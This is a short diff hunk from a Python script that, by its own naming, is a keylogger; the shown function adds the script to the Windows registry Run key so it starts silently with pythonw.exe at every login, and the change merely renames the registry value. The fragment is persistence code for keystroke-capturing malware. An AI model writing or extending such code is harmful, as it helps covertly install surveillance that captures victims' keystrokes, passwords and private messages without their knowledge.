@@ -33,7 +33,7 @@ def add_to_startup():
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
         0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, f"pythonw.exe \"{script_path}\"")
+        winreg.SetValueEx(key, "KeyLogger", 0, winreg.REG_SZ, f"pythonw.exe \"{script_path}\"")
         winreg.CloseKey(key)
     except Exception as e:
         log_error(f"Erreur lors de l'ajout au démarrage : {e}")
